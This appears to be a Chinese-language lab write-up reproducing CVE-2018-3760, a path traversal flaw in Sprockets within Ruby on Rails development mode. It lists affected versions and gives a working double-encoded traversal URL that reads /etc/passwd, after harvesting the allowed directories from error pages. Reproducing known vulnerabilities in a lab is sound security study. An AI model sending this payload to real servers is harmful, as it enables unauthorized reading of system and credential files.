# Ruby On Rails路径遍历漏洞（CVE-2018-3760）

###### by ADummy

### 0x00利用路线

​			通过报错获取允许目录的列表--->通过允许的目录绕过访问任意文件

### 0x01漏洞介绍

​			Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。

Sprockets 3.7.1及更低版本中的辅助解码导致路径穿越漏洞。攻击者可以`%252e%252e/`用来访问根目录并读取或执行目标服务器上的任何文件。

##### 			影响版本

```
Sprockets <3.7.1
```

### 0x02漏洞复现

`http://your-ip:3000`，您会看到欢迎页面。

![Ruby_On_Rails路径遍历漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径遍历漏洞_1.jpg)

`http://your-ip:3000/assets/file:%2f%2f/etc/passwd`由于该文件`/etc/passwd`不在允许的目录中，因此直接访问将产生错误

![Ruby_On_Rails路径遍历漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径遍历漏洞_2.jpg)

我们可以通过错误页面获取允许目录的列表。只需选择其中一个，例如`/usr/src/blog/vendor/assets/javascripts`，然后使用`%252e%252e/`跳转到父目录，最后读取文件`/etc/passwd`：

```
http://your-ip:3000/assets/file:%2f%2f/usr/src/blog/vendor/assets/javascripts/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

![Ruby_On_Rails路径遍历漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Ruby_On_Rails路径遍历漏洞_3.jpg)



